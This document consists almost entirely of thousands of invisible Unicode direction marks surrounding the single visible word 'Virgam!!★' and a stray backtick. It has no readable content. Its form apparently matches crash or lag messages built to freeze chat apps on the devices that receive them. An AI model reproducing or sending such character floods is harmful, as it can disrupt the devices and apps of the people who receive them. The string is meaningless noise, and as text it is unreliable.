‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎Virgam!!★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏
`
